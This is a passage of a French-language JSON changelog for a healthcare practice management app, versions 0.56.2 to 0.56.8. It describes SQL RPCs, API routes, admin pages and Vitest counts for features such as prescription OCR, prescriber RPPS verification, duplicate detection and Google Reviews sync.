      { "code": "SQL", "txt": "RPC prescriptions_archive_stats(p_date_debut, p_date_fin) : 16 agrégats sur la période (total, actives/archivees/annulees, lignes, DCI uniques avec fallback nom commercial si DCI null, prescripteurs uniques avec préférence RPPS puis nom case-insensitive, patients uniques, OCR vs manuelle, RPPS vérifiés, premier/dernier date, tokens IA cumulés). Toutes les agrégations isolées par structure_id via membres_structure" },
      { "code": "SQL", "txt": "RPC prescriptions_top_medicaments(p_limit 20, p_date_debut, p_date_fin) : top N médicaments classés par nb_prescriptions. Préfère DCI (upper-case) sinon fallback nom commercial. Retourne medicament + flag est_dci (true si DCI fourni) + nb_patients_uniques + nb_prescripteurs_uniques. Permet d'identifier les molécules les plus prescrites au-delà des noms commerciaux" },
      { "code": "SQL", "txt": "RPC prescriptions_top_prescripteurs(p_limit 20) : top N prescripteurs classés par nb_prescriptions. Groupe par nom case-insensitive. Retourne nom, prénom (max si plusieurs), RPPS, spécialité, medecin_id (lien vers annuaire 0.56.5), rpps_verifie agrégé via bool_or, nb_patients_uniques, nb_lignes total, première+dernière date" },
      { "code": "SQL", "txt": "RPC prescriptions_par_mois(p_mois_count 12) : histogramme mensuel pour les N derniers mois. Utilise generate_series + LEFT JOIN pour inclure les mois sans prescription (compte = 0, important pour graphique continu). Retourne nb_prescriptions + nb_lignes + nb_patients_uniques + nb_ocr (via count filter)" },
      { "code": "BE", "txt": "Nouvelle route /api/prescriptions/search : POST avec body de filtres (patient_id, prescripteur_nom, RPPS, medicament_query, dci_query, type, source, statut, date_debut, date_fin, rpps_verifie). Si recherche médicament/DCI, passe d'abord par prescriptions_lignes pour récupérer les IDs (via ilike + Set deduplication) puis filtre les prescriptions sur ces IDs. Pagination range(offset, offset+limit-1), cap limit 500. Retour : count, total_estime, results avec join patients + etablissements" },
      { "code": "BE", "txt": "Nouvelle route /api/prescriptions/export-csv : POST avec mêmes filtres que /search. Limite 5000 lignes max (sécurité mémoire). Génère un CSV avec BOM UTF-8 pour ouverture Excel correcte, séparateur ;, CRLF entre lignes, échappement quotes/retour-ligne/séparateur. Option include_lignes=true qui ajoute une colonne 'Médicaments (liste)' avec concat nom + dosage + posologie pour chaque ligne, + colonne 'Nb lignes'. Content-Disposition attachment avec nom de fichier daté" },
      { "code": "FE", "txt": "Nouvelle page /admin/prescriptions-archive : 4 onglets — Recherche (formulaire multi-critères + résultats), Top médicaments (bar chart proportionnel, badge DCI vert si DCI), Top prescripteurs (avec badge RPPS vérifié, spécialité, ville, lien fiche médecin), Tendances par mois (graphique 12 mois en barres avec gradient violet + tableau détaillé). 8 KPI au top (total prescriptions mis en évidence + lignes + DCI uniques + prescripteurs + patients + OCR + RPPS vérifiés + tokens IA)" },
      { "code": "FE", "txt": "Page admin recherche : formulaire compact (grid auto-fit 180px) avec 9 champs filtres (prescripteur nom/RPPS, médicament/DCI, type, source, statut, date début/fin), bouton Rechercher + Réinitialiser. Liste de résultats cliquables (ouvre fiche patient onglet prescriptions), 100 max par page avec indication du total estimé. 2 boutons d'export CSV qui apparaissent uniquement si résultats : 'Export CSV' (simple) et 'Export + médicaments' (avec lignes concaténées)" },
      { "code": "FE", "txt": "Téléchargement CSV : appel API → blob → URL.createObjectURL → lien temporaire <a download> simulé + cleanup URL.revokeObjectURL. Fichier nommé prescriptions-archive-YYYY-MM-DD.csv. Composant MonthBarChart : graphique horizontal en barres flex avec hauteur proportionnelle, gradient violet, label de valeur au-dessus + nom du mois en dessous, tooltip natif via title" },
      { "code": "FE", "txt": "Entrée menu Administration : 'Prescriptions archive' (ti-archive violet sombre) entre 'Doublons forces' et 'Diagnostic envoi mail'. Section Administration grossit à 10 entrées maintenant : Diagnostic API RPPS, Dump RPPS Plan B, Bulletins archivés, Caisses & Mutuelles, Médecins prescripteurs, Avis Google, Doublons forces, Prescriptions archive, Diagnostic envoi mail" },
      { "code": "AI", "txt": "+52 tests Vitest : SQL index (3), RPC stats (4 : security definer + dates, 16+ champs, DCI fallback, prescripteurs distinct), RPC top médicaments (5 : params, DCI fallback, est_dci flag, distinct patients/prescripteurs, tri desc), RPC top prescripteurs (4 : exists, group lower, medecin_id+bool_or rpps_verifie, dates min/max), RPC par mois (4 : params, generate_series, left join, filter OCR), API search (7 : exists, POST, médicament passe par lignes, ilike, dates gte/lte, range pagination, join patients+etabs, cap 500), API export-csv (9 : exists, maxDuration, csvEscape, BOM UTF-8 + ;, CRLF, headers attachment, include_lignes, limit 5000, header complet), Page admin (15 : exists, 4 onglets, 4 RPC, 8 KPI, 9 filtres, Bearer auth, 2 exports CSV, Blob download, reset, top meds avec proportions, top presc badge vérifié, MonthBarChart, table détaillée, lien fiche patient), Menu (1). Total 1985 tests verts (vs 1933)" }
    ],
    "themes": ["admin", "prescription", "stats", "export", "csv", "search"],
    "date": "1er juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.56.8.html",
    "sqlFile": "aveho-PATCH-vers-0.56.8.sql"
  },
  {
    "v": "0.56.7",
    "kind": "version",
    "titre": "🔍 Détection doublons forces · audit qualité 3 cibles (étabs + groupements + médecins) · similarité fuzzy pg_trgm + slider seuil ajustable",
    "chantiers": [
      { "code": "SQL", "txt": "Patch 0.56.7 : extension PostgreSQL pg_trgm activée (fonction similarity() qui compare 2 strings par trigrammes — 0 = totalement différent, 1 = identique). 3 index GIN trigramme : idx_etablissements_nom_trgm, idx_groupements_nom_trgm, idx_medecins_nom_trgm. Accélère drastiquement les recherches par similarité (sinon scan séquentiel sur toutes les paires possibles)" },
      { "code": "SQL", "txt": "Table doublons_ignores : permet de marquer une paire comme 'non-doublon' pour qu'elle disparaisse des futures détections. Colonnes : structure_id, cible (etablissement/groupement/medecin), entity_id_1, entity_id_2, raison, ignore_par. Contrainte check (entity_id_1 < entity_id_2) pour éviter (A,B) et (B,A) en doublons. Contrainte unique (struct, cible, id_1, id_2). 3 RLS isolant par structure" },
      { "code": "SQL", "txt": "RPC detecter_doublons_etablissements(p_seuil 0.55, p_max 100) : stratégie en cascade — SIRET identique → score 1.0 (certain), FINESS identique → 0.95, sinon similarity(nom) avec motif 'Nom similaire' ou 'Nom similaire + même CP' si CP identique. Évite (A,B) et (B,A) via e1.id < e2.id. Filtre les paires déjà ignorées via not exists doublons_ignores. Retourne 14 colonnes (id/nom/siret/finess/cp/ville pour chaque + score + motif)" },
      { "code": "SQL", "txt": "RPC detecter_doublons_groupements(p_seuil 0.6) : similarity sur nom + nb_etabs par groupement pour aider à décider lequel fusionner (celui avec 0 étab est probablement le doublon). Filtre archive=false. RPC detecter_doublons_medecins(p_seuil 0.6) : RPPS identique → 1.0, sinon similarity(nom + prénom concaténés). Retourne RPPS, spécialité, ville, nb_prescriptions pour les 2 médecins pour aider à décider" },
      { "code": "SQL", "txt": "RPC ignorer_doublon(cible, id_1, id_2, raison) : récupère la structure_id en cohérence avec la cible (etablissements/groupements/medecins_prescripteurs), stocke toujours les IDs triés via least/greatest pour éviter doublons d'ignores, ON CONFLICT DO NOTHING (idempotent), trace l'utilisateur via auth.uid()" },
      { "code": "SQL", "txt": "RPC doublons_stats(p_seuil_etab, p_seuil_grp, p_seuil_med) : agrégat global pour les KPI — nb doublons par cible + nb ignorés + total. Permet d'avoir un compteur en temps réel sans relancer les 3 détections individuellement" },
      { "code": "FE", "txt": "Nouvelle page /admin/doublons-forces : 3 onglets (Établissements bleu / Groupements vert / Médecins violet) avec compteurs. Slider de seuil de similarité ajustable de 30% (très permissif) à 95% (très strict), seuil par défaut différent par cible (0.55 étabs, 0.6 groupements et médecins). Bouton 'Relancer la détection' avec spinner. Empty state vert si aucun doublon détecté ('Données propres')" },
      { "code": "FE", "txt": "Page admin : cartes de doublon avec affichage côte à côte des 2 entités (couleurs distinctes bleu/vert ou violet/violet clair) + ScoreBadge central coloré selon palier (rouge ≥95% Quasi-certain / ambré ≥80% Forte similarité / violet sinon Suggestion) + motif explicite (SIRET identique, FINESS identique, RPPS identique, Nom similaire + même CP, etc.). Bouton 'Marquer non-doublon' avec prompt() pour saisir la raison (optionnelle)" },
      { "code": "FE", "txt": "Cartes spécifiques par cible : DoublonCardEtab affiche SIRET + FINESS + CP/ville, DoublonCardGroupement affiche nb_etabs (utile pour identifier le groupement vide à supprimer), DoublonCardMedecin affiche RPPS + spécialité + ville + nb_prescriptions (utile pour fusionner vers celui qui a déjà des ordonnances)" },
      { "code": "FE", "txt": "Page admin : 5 KPI globaux en haut (Total mis en évidence rouge + 3 cibles + Ignorés). Panneau pédagogique en bas qui explique le fonctionnement (SIRET → 100%, FINESS → 95%, etc.), la signification du seuil, et la possibilité de marquer non-doublon pour les vrais cas distincts. Composant TabBtn réutilisé avec compteur intégré" },
      { "code": "FE", "txt": "Entrée menu Administration : 'Doublons forces' (ti-copy rouge) entre 'Avis Google' et 'Diagnostic envoi mail'. Section Administration grossit à 9 entrées : Diagnostic API RPPS, Dump RPPS Plan B, Bulletins archivés, Caisses & Mutuelles, Médecins prescripteurs, Avis Google, Doublons forces, Diagnostic envoi mail" },
      { "code": "AI", "txt": "+44 tests Vitest : SQL pg_trgm + index (2), table doublons_ignores (3 : structure, contraintes, RLS), RPC etabs (7 : params, SIRET 1.0, FINESS 0.95, similarity, e1.id < e2.id, filtre ignorés, motifs), RPC groupements (3 : exists, nb_etabs, archive false), RPC médecins (5 : exists, RPPS 1.0, similarity nom+prenom, champs retournés, motifs), RPC ignorer (5 : params, structure cohérence, least/greatest, ON CONFLICT, auth.uid), RPC stats (2 : params, retour agrégat), Page admin (15 : exists, 3 onglets, RPC stats, 3 RPCs détection, slider 30-95%, seuils par défaut, ignorer prompt, cibleSingular, ScoreBadge 3 paliers, 3 cards spécifiques, SIRET/FINESS, nb_etabs, RPPS+nb_presc, empty state, 5 KPI, pédagogie), Menu (1). Total 1933 tests verts (vs 1889)" }
    ],
    "themes": ["admin", "audit", "doublons", "fuzzy_matching", "pg_trgm"],
    "date": "1er juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.56.7.html",
    "sqlFile": "aveho-PATCH-vers-0.56.7.sql"
  },
  {
    "v": "0.56.6",
    "kind": "version",
    "titre": "⭐ Sync Google Reviews automatique · Edge Function + cron 6h · stockage des avis + page admin pilotage",
    "chantiers": [
      { "code": "SQL", "txt": "Patch 0.56.6 : ajout 5 colonnes sur etablissements (google_place_id, google_rating, google_ratings_count, google_last_sync_at, google_sync_status). Index partiel sur google_place_id where not null. Nouvelle table etablissements_avis_google avec 14 colonnes (author + profile photo + rating 1-5 + publish_time absolue + relative_time_description 'il y a 2 mois' + text_content + traduction + reply_text + raw_payload jsonb pour debug). Contrainte unique nulls not distinct (etab, author, publish) pour déduplication propre" },
      { "code": "SQL", "txt": "Table google_sync_logs : audit complet de chaque run (trigger_source cron/manual, etabs total/ok/errors, nouveaux_avis, duration_ms, details jsonb). 4 RLS sur table avis isolant par structure. RPC upsert_avis_google_batch avec jsonb_to_recordset + ON CONFLICT DO UPDATE (déduplication automatique). RPC avis_google_stats qui renvoie répartition par note (5★/4★/3★/2★/1★) + rating moyen + dernière sync" },
      { "code": "SQL", "txt": "Cron Supabase via pg_cron : job 'sync-google-reviews-cron' planifié toutes les 6h ('0 */6 * * *' = minuit/6h/12h/18h). Utilise net.http_post pour appeler l'Edge Function avec service_role. Configuration via current_setting('app.settings.sync_google_reviews_url') et service_role_key — à définir une fois via ALTER DATABASE ou Supabase Vault" },
      { "code": "BE", "txt": "Nouvelle Edge Function /supabase/functions/sync-google-reviews/index.ts : Deno.serve, client service_role (bypass RLS), itère sur les établissements avec google_place_id, appelle l'API Google Places Details pour chacun avec fields=name,rating,user_ratings_total,reviews&language=fr. Update du rating + count + statut sur l'établissement, upsert batch des avis via RPC. Gère le rate limit OVER_QUERY_LIMIT (arrête la boucle pour ne pas brûler le quota), délai 200ms entre 2 appels Google, statuts ok/api_error/rate_limited/exception" },
      { "code": "BE", "txt": "Edge Function : support body.etablissement_id pour synchroniser un seul établissement à la demande (utilisé depuis le bouton 'Sync' par ligne dans l'admin). Logs détaillés du run avec per_etab array dans details jsonb. Retourne {etablissements_total, etablissements_ok, etablissements_errors, nouveaux_avis, duration_ms} pour affichage UI immédiat" },
      { "code": "BE", "txt": "Nouvelle route /api/google-reviews/sync : maxDuration 60s + dynamic force. Appelle l'Edge Function via supabase.functions.invoke. Lit le body d'erreur en streaming via getReader + TextDecoder (réflexe 48) pour avoir un message d'erreur clair en cas de FunctionsHttpError. Transmet le token utilisateur Bearer pour respecter les permissions" },
      { "code": "FE", "txt": "Nouvelle page /admin/avis-google : (1) 6 KPI stats (étabs avec Place ID, avis total, rating moyen avec ★, 5 étoiles, critiques 1-2 étoiles, dernière sync), (2) carte sync manuelle avec bouton 'Lancer la sync' qui appelle l'Edge Function, (3) liste des établissements avec badge statut coloré (vert ok / ambré rate_limited / rouge api_error / gris jamais sync) + rating Google ★ + bouton Sync par ligne, (4) liste des 100 derniers avis avec photo auteur, étoiles, contenu, réponse établissement si présente — mise en évidence visuelle des critiques (bordure rouge 1-2★) et excellents (bordure verte 4-5★)" },
      { "code": "FE", "txt": "Page admin : 2 filtres combinables (par note avec option 'Critiques 1-2' spécifique, par établissement). Composant Stars qui affiche les étoiles ti-star-filled + ti-star Tabler. Affichage réponse de l'établissement si reply_text présent (panneau bleu avec icône message-reply). Tableau historique des 10 derniers runs avec badges cron (violet) / manual (vert)" },
      { "code": "FE", "txt": "Entrée menu Administration : 'Avis Google' (ti-star ambré) entre 'Médecins prescripteurs' et 'Diagnostic envoi mail'. Section Administration grossit à 8 entrées maintenant : Diagnostic API RPPS, Dump RPPS Plan B, Bulletins archivés, Caisses & Mutuelles, Médecins prescripteurs, Avis Google, Diagnostic envoi mail" },
      { "code": "AI", "txt": "+41 tests Vitest : SQL (12 : 5 colonnes etablissements, index partiel, table avis 14 col, raw_payload, unique nulls, 4 RLS, table logs, RPC upsert batch, RPC stats, pg_cron 6h, net.http_post), Edge Function (13 : exists, Deno.serve, env vars, service_role, filtre place_id, Google API URL, OVER_QUERY_LIMIT, update statut, RPC, 200ms delay, log run, support 1 étab), Route /api/google-reviews/sync (5 : exists, maxDuration, functions.invoke, getReader, single etab), Page admin (10 : exists, RPC stats+tables, 6 KPI, triggerSync global+par étab, badge statut coloré, filtres notes+étabs, mise en évidence critiques, Stars component, reply, historique, pédagogie). Total 1889 tests verts (vs 1848)" }
    ],
    "themes": ["google", "etablissement", "edge_function", "cron", "admin"],
    "date": "1er juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.56.6.html",
    "sqlFile": "aveho-PATCH-vers-0.56.6.sql"
  },
  {
    "v": "0.56.5",
    "kind": "version",
    "titre": "🩺 Auto-link RPPS prescripteur · vérification ANS automatique sur OCR ordonnance · annuaire local medecins_prescripteurs avec stats",
    "chantiers": [
      { "code": "SQL", "txt": "Patch 0.56.5 : nouvelle table medecins_prescripteurs (cache local des médecins vus via OCR) avec 18 colonnes (identification, profession, lieu d'exercice complet incluant coords GPS, vérification ANS, stats d'usage). Contrainte unique (rpps, structure_id) NULLS NOT DISTINCT pour permettre plusieurs médecins sans RPPS mais éviter doublons RPPS connus. 4 index : structure+nom, RPPS partiel, spécialité partielle, nom lower" },
      { "code": "SQL", "txt": "FK prescriptions.medecin_prescripteur_id (set null on delete pour garder l'historique même si on supprime un médecin) + rpps_verifie boolean + rpps_source_verification text ('ANS FHIR' / 'dump_local' / 'manuel'). Index partiel sur les prescriptions liées à un médecin" },
      { "code": "SQL", "txt": "4 policies RLS standard (select/insert/update/delete) isolant par structure_id via membres_structure. Trigger SQL trg_prescriptions_refresh_medecin (after insert/update/delete on prescriptions) qui recalcule automatiquement nb_prescriptions + premiere/derniere_prescription_date sur le médecin lié" },
      { "code": "SQL", "txt": "RPC upsert_medecin_from_ocr() security definer : recherche d'abord par RPPS+structure (clé forte), sinon par nom+prenom case-insensitive. Si trouvé : UPDATE avec coalesce (préfère les données existantes, enrichit les champs null). Sinon INSERT nouveau. Si est_verifie passe à true, met à jour source_verification + date_verification" },
      { "code": "SQL", "txt": "RPC medecins_stats() : total_medecins, verifies_ans, verifies_dump, non_verifies, total_prescriptions, derniere_activite — pour le tableau de bord admin" },
      { "code": "BE", "txt": "Nouvelle route /api/prescriptions/verify-rpps : POST avec body {rpps, nom_ocr, prenom_ocr, specialite_ocr}. Valide le RPPS (11 chiffres), appelle /api/rpps?rpps=... en interne (réutilise le fallback ANS→dump_local de 0.55.56), compare champ par champ avec normalisation accents/casse. Retourne status: 'match' / 'divergences' / 'not_found' / 'invalid_rpps' / 'error' + objet 'official' complet pour proposer un écrasement" },
      { "code": "BE", "txt": "Route /api/prescriptions/from-ocr enrichie : (1) appelle upsert_medecin_from_ocr avant l'insert de la prescription pour avoir le medecin_prescripteur_id, (2) si RPPS fourni, lance une vérification automatique non bloquante (try/catch silencieux) contre /api/rpps pour enrichir les données avec ANS/dump et marquer est_verifie=true + source_verification. (3) stocke medecin_prescripteur_id + rpps_verifie + rpps_source_verification sur la prescription. (4) retourne aussi ces 3 valeurs dans la réponse" },
      { "code": "FE", "txt": "Nouveau composant /app/RppsVerifyBadge.js réutilisable : useEffect qui déclenche automatiquement la vérification dès qu'un RPPS est saisi. Validation 11 chiffres en amont. 5 états visuels distincts : loading (gris + spinner), match (vert + détails dépliables), divergences (ambré + comparaison OCR vs officiel + bouton 'Utiliser les données officielles'), not_found (rouge), invalid_rpps (rouge avec message clair), error (rouge). Composant DivergenceRow qui affiche en grid 2 colonnes les valeurs OCR vs ANS pour chaque champ divergent. Flag cancelled au cas où le RPPS change pendant le fetch" },
      { "code": "FE", "txt": "Intégration RppsVerifyBadge dans /scan/prescription : affiché dans le panneau Prescripteur juste sous la grille de champs, dès que editedData.prescripteur.rpps est rempli. Compare nom + prenom + specialite extraits par OCR avec les données officielles. Callback onOfficialData met à jour tous les champs prescripteur + marqueurs _rpps_verified + _rpps_source en un clic" },
      { "code": "FE", "txt": "Nouvelle page /admin/medecins-prescripteurs : (1) 6 KPI (total, vérifiés ANS, vérifiés dump, non vérifiés, total prescriptions, dernière activité), (2) filtre live multi-champs (nom, RPPS, spécialité, ville) + filtre statut all/verifie/non_verifie, (3) liste tri date desc puis nom alphabétique, (4) badges statut Vérifié vert (avec source) / Non vérifié ambré, (5) ContactActions sur chaque ligne, (6) bouton 'Vérifier' qui relance la vérification + écrase les champs vides avec les données officielles, (7) panneau pédagogique en bas" },
      { "code": "FE", "txt": "Entrée menu Administration : 'Médecins prescripteurs' (ti-stethoscope violet) entre 'Caisses & Mutuelles' et 'Diagnostic envoi mail'. La section Administration grossit encore avec maintenant 7 entrées : Diagnostic API RPPS, Dump RPPS Plan B, Bulletins archivés, Caisses & Mutuelles, Médecins prescripteurs, Diagnostic envoi mail" },
      { "code": "AI", "txt": "+49 tests Vitest : SQL (13 : table + colonnes + contrainte unique nulls not distinct + index + FK prescriptions + RLS + trigger + RPC upsert coalesce + RPC stats), API verify-rpps (7 : exists, validation RPPS 11 chiffres, appel /api/rpps, normalisation accents, 4 statuts, official complet, divergences), Composant RppsVerifyBadge (8 : exists, useEffect auto, 5 statuts visuels, match expand, divergences écrasement, not_found, invalid_rpps, cancelled cleanup), Intégration /scan/prescription (4 : import, badge si RPPS, onOfficialData update, props nom/prenom/specialite), Route from-ocr enrichie (6 : upsert_medecin RPC, vérif auto RPPS, enrichissement payload, stockage 3 champs sur prescription, retour réponse, try/catch silencieux), Page admin medecins (10 : exists, stats RPC, list desc, filtre nom/RPPS, filtre statut, verifyNow, ContactActions, badge statut, nb_prescriptions, 6 KPI), Menu (1). Total 1848 tests verts (vs 1799)" }
    ],
    "themes": ["prescription", "rpps", "ai", "admin", "ans"],
    "date": "1er juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.56.5.html",
    "sqlFile": "aveho-PATCH-vers-0.56.5.sql"
  },
  {
    "v": "0.56.4",
    "kind": "version",
    "titre": "🏥 Gestion référentiels caisses + mutuelles · 2 onglets admin · CRUD complet · actions tel/mail/GPS/web partout (fiche patient incluse)",
    "chantiers": [
      { "code": "SQL", "txt": "Patch 0.56.4 : ajout colonnes latitude + longitude (numeric 10,7) sur caisses_assurance_maladie et mutuelles + email sur mutuelles (n'existait pas avant). 2 index partiels idx_caisses_coords + idx_mutuelles_coords where not null pour futures requêtes par proximité géographique. 100% idempotent" },
      { "code": "BE", "txt": "Route /api/caisses étendue avec 3 nouvelles méthodes : POST création (validation nom + code_organisme obligatoires, détection duplicate via code 23505), PUT mise à jour (id requis dans body), DELETE par id en query string. Toutes utilisent le Bearer token utilisateur pour respecter RLS. Payload complet : nom, code_organisme, type, regime, departement, region, adresse, code_postal, ville, telephone, email, site_web, latitude, longitude" },
      { "code": "BE", "txt": "Route /api/mutuelles étendue avec POST/PUT/DELETE symétrique. POST valide nom obligatoire (le numero_amc reste optionnel). Payload : nom, numero_amc, type (mutuelle/assurance/prevoyance/autre), adresse, cp, ville, telephone, email, site_web, latitude, longitude" },
      { "code": "FE", "txt": "Nouveau composant /app/ContactActions.js réutilisable : pastilles d'actions cliquables tel/mail/GPS/web qui s'affichent automatiquement selon les champs renseignés. tel: protocole, mailto:, Google Maps URL (avec coords lat/lng en priorité sinon fallback adresse texte URL-encodée), site web (ajoute https:// si manquant). 3 tailles (sm/md/lg). stopPropagation au clic pour ne pas déclencher le parent. Message 'Pas de coordonnées' si vide" },
      { "code": "FE", "txt": "Nouvelle page /admin/referentiels-sante : 2 onglets côte à côte (Caisses bleu / Mutuelles violet) avec compteur sur chaque. Filtre live multi-champs (nom, code, n° AMC, ville, département). Bouton 'Nouvelle caisse/mutuelle' déclenche modale création. Liste avec ContactActions en bas de chaque ligne (tel/mail/GPS/web)" },
      { "code": "FE", "txt": "Page admin : modale unifiée création/édition (640px max, scrollable) avec sections (Identification, Coordonnées, Contact). Selecteur type CPAM/CGSS/CSSM/MSA/CNMSS/LMG/CAMIEG/CAVIMAC/MNH/autre pour caisses, mutuelle/assurance/prevoyance/autre pour mutuelles. Selecteur régime general/agricole/militaire/fonctionnaire/special/drom. AdresseAutocomplete BAN INSEE qui remplit auto cp + ville + lat/lng. Badge vert confirmation 'Géocodage : X.XXXXX, Y.YYYYY' si coords présentes" },
      { "code": "FE", "txt": "Suppression sécurisée : confirm() obligatoire avec message 'irréversible'. Si la caisse/mutuelle est rattachée à des patients, la contrainte FK l'empêche → message d'erreur explicite. Message succès/erreur en haut de page avec icône ti-check/ti-alert-circle" },
      { "code": "FE", "txt": "Intégration ContactActions dans /patient/[id]/edit onglet 'Sécu & Mutuelle' : sous le bloc caisse affichée + sous le bloc mutuelle affichée. Permet à l'utilisateur d'appeler/mailer/router vers le bon organisme directement depuis la fiche patient sans avoir à aller chercher les coordonnées ailleurs. Refactoring du JSX pour grouper le contenu dans un wrapper" },
      { "code": "FE", "txt": "Entrée menu Administration : 'Caisses & Mutuelles' (ti-shield-check violet) entre 'Bulletins archivés' et 'Diagnostic envoi mail'. Section Administration grossit avec : Diagnostic API RPPS, Dump RPPS Plan B, Bulletins archivés, Caisses & Mutuelles, Diagnostic envoi mail" },
      { "code": "AI", "txt": "+37 tests Vitest : SQL (3 : lat/lng caisses, email+coords mutuelles, index partiels), API caisses CRUD (5 : POST validation, PUT id, DELETE query, duplicate 23505, RLS Bearer), API mutuelles CRUD (4 : POST nom, PUT, DELETE, payload complet), ContactActions (9 : exists, tel, mail, GPS, fallback adresse, https auto, 3 tailles, stopPropagation, message vide), Page admin (12 : 2 onglets, filtre, openCreate, modale unifiée, POST/PUT switch, confirm suppression, ContactActions affiché, BAN autocomplete, géocodage, compteurs, duplicate flag), Intégration fiche patient (3 : import, caisse, mutuelle), Menu (1). Total 1799 tests verts (vs 1762)" }
    ],
    "themes": ["admin", "referentiels", "patient", "ui_ux"],
    "date": "1er juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.56.4.html",
    "sqlFile": "aveho-PATCH-vers-0.56.4.sql"
  },
  {
    "v": "0.56.3",
    "kind": "version",
    "titre": "💊 OCR Ordonnances · Claude Vision extrait prescripteur + médicaments structurés · onglet Prescriptions sur fiche patient",
    "chantiers": [
      { "code": "SQL", "txt": "Patch 0.56.3 : table prescriptions (en-tête : patient_id, structure_id, prescripteur_nom/prenom/RPPS/specialite/adresse/tel/email/finess, date_prescription, type_prescription (ordonnance/bizone/medicaments_exception/hospitaliere/securisee), duree_traitement, est_renouvelable, nb_renouvellements, notes_libres, fichier_path/mime/size_kb, ocr_brut/date/confiance/tokens, statut, source_creation). Table prescriptions_lignes (medicament_nom/dci/forme/dosage/voie, posologie_libre+structurée qte/unite/prises_par_jour/duree_jours, quantite_a_delivrer, est_renouvelable, commentaire)" },
      { "code": "SQL", "txt": "Bucket Storage prescriptions-scannees (privé, 10 Mo max, MIME image/* + PDF) avec 4 policies RLS isolant par structure_id (premier segment du path). Convention {structure_id}/{patient_id}/{prescription_id}/{ts}-{filename}. 4 RLS prescriptions + 4 RLS prescriptions_lignes (via FK) + 4 RLS storage = 12 policies au total. Indexes patient_id+date desc, structure_id+date desc, RPPS partiel, DCI lower" },
      { "code": "SQL", "txt": "RPC prescriptions_stats() security definer : total prescriptions, total actives, total lignes, prescripteurs uniques, premier/dernier date, tokens IN/OUT cumulés. Pour la page admin stats future" },
      { "code": "BE", "txt": "Nouvelle route /api/ocr/prescription : maxDuration 60s + AbortController 55s, prompt spécialisé ordonnances françaises 'Tu es un assistant spécialisé...' avec format JSON strict imposé (pas de markdown). Demande prescripteur complet + médicaments structurés (nom commercial, DCI déductible, forme, dosage, voie, posologie libre+structurée prises/jour/durée, quantité à délivrer, renouvelable, commentaire). Support PDF via type=document. Retourne {ok, data, ocr_text, model, duration_ms, tokens}" },
      { "code": "BE", "txt": "Règles du prompt : type_prescription auto-détecté (bizone si 2 zones ALD/hors-ALD, securisee si papier vert filigrané, etc.). Conversion auto durée 'X mois' → jours. Posologie 'matin midi soir' → 3 prises/jour. 'un demi' → 0.5. ALD marqué dans commentaire. JAMAIS d'invention — préférer null à valeur incertaine. Confiance globale haute/moyenne/faible retournée" },
      { "code": "BE", "txt": "Nouvelle route /api/prescriptions/from-ocr : insère la prescription puis batch insert des lignes médicaments. Utilise le Bearer token utilisateur pour respecter RLS. Source_creation='ocr' + audit complet (tokens, confiance, OCR brut). Retourne {ok, prescription_id, nb_lignes} avec warning non bloquant si lignes échouent" },
      { "code": "FE", "txt": "Nouveau helper lib/prescriptionsStorage.js : uploadPrescription({structureId, patientId, prescriptionId}), getSignedUrl(path, 3600), deletePrescription. Convention path à 3 niveaux pour ranger correctement plusieurs ordonnances par patient" },
      { "code": "FE", "txt": "Nouvelle page /scan/prescription (650+ lignes) : workflow 4 étapes (upload → OCR Claude → vérification édition → patient & création). Sélecteur de patient avec recherche live (nom/prénom/dossier), pré-sélection via ?patient_id= query string. Édition complète prescripteur + meta + chaque médicament (champs structurés ajoutables/supprimables). Badge confiance OCR coloré (haute vert / moyenne ambre / faible rouge). Affichage durée OCR + tokens consommés" },
      { "code": "FE", "txt": "Page /scan/prescription : Suspense boundary obligatoire pour useSearchParams (sinon prerender error Next.js). Archivage Storage post-création non bloquant — la prescription est créée même si l'upload Storage échoue. Étape done avec badge bleu 'Ordonnance archivée dans Storage' + bouton 'Voir la fiche patient'" },
      { "code": "FE", "txt": "Nouvel onglet 'Prescriptions' sur /patient/[id]/edit (7ème onglet, icône ti-prescription violet) : liste les prescriptions tri date desc, badges statut (active/archivée/annulée) + type + source (badge OCR violet si extraction IA), expand/collapse au clic pour voir les médicaments avec dosage + forme + posologie + commentaire ALD, lien signé vers l'ordonnance scannée originale. Chargement lazy des lignes (1 requête par expand). Bouton 'Scanner une ordonnance' pré-remplit le patient" },
      { "code": "FE", "txt": "Entrée menu Outils scan : 'OCR Ordonnance' (ti-prescription violet) entre 'Créer patient depuis bulletin' et 'Scan QR code'" },
      { "code": "AI", "txt": "+48 tests Vitest : SQL (12 : table prescriptions, prescripteur, méta, archivage+OCR audit, table lignes, médicament, posologie, bucket privé MIME, 12 RLS, isolation structure, indexes, RPC stats), Helper storage (4 : BUCKET, buildPath 3 niveaux, uploadPrescription, getSignedUrl), Route OCR (8 : exists, maxDuration+dynamic, modèle Sonnet 4, ANTHROPIC_API_KEY, prompt ordonnances, AbortController 55s, support PDF, retour structuré), Route from-ocr (5 : exists, validation params, insert+batch lignes, Bearer token RLS, source ocr), Page scan (10 : exists, Suspense, 4 étapes, appels API, édition meds, sélecteur patient, pré-sélection query, archivage, warning, posologie structurée), Onglet patient (7 : tab ajouté, composant rendu, tri+statut, lazy load, redirection scan, signed URL, badge OCR), Menu (1), Version (1). Total 1762 tests verts (vs 1714)" }
    ],
    "themes": ["ocr", "patient", "prescription", "ai", "storage"],
    "date": "1er juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.56.3.html",
    "sqlFile": "aveho-PATCH-vers-0.56.3.sql"
  },
  {
    "v": "0.56.2",
    "kind": "version",
    "titre": "📷 Scan QR fonctionnel · caméra arrière html5-qrcode + parser intelligent Vitale/GS1/EAN/URL · actions contextuelles par type",
    "chantiers": [
      { "code": "FE", "txt": "Installation html5-qrcode@^2.3.8 (10ème dépendance npm) en dynamic import dans le composant pour ne pas alourdir le bundle de démarrage (~150 Ko chargés à la demande)" },
      { "code": "FE", "txt": "Nouveau composant /app/QrScanner.js (réutilisable) : démarre la caméra arrière en priorité (regex back|arrière|rear|environment sur le label), liste les caméras dispo et propose un select si plusieurs, qrbox responsive 70% du min(vw,vh), fallback scan depuis fichier image (utile desktop ou caméra HS), cleanup propre au unmount (stop + clear)" },
